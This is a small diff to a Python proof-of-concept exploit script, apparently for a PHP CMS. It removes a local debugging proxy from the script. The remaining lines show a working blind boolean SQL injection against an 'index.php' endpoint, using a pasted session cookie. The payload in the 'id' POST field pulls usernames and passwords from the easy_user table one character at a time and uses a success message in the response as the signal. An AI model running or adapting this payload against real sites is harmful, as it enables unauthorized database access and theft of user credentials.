@@ -6,7 +6,6 @@ def poc():
 		if  not target.url.endswith("index.php"):
 			print("[*] Please make sure the url end with 'index.php'")
 			exit()
-		proxy = {'http':'http://127.0.0.1:8080'}
 		cookie = raw_input("[*] Please paste the cookie:").split(';')
 		cookies = {}
 		for i in range(0,len(cookie)):
@@ -25,7 +24,7 @@ def poc():
 					"Content-Type":"application/x-www-form-urlencoded"
 				}
 				postdata = "id=1 and ascii(substr(((SELECT GROUP_CONCAT(username,0x20,password) FROM easy_user)),"+ str(j) +",1))%3d" + str(index[i]) + "&email=test%40test.com&sex=" + str(i+100)
-				r = requests.post(url,headers=header,data=postdata,cookies=cookies,proxies=proxy)
+				r = requests.post(url,headers=header,data=postdata,cookies=cookies)
 
 				if "\u66f4\u65b0\u6210\u529f".decode('unicode_escape') in r.text:
 					if (index[i]):
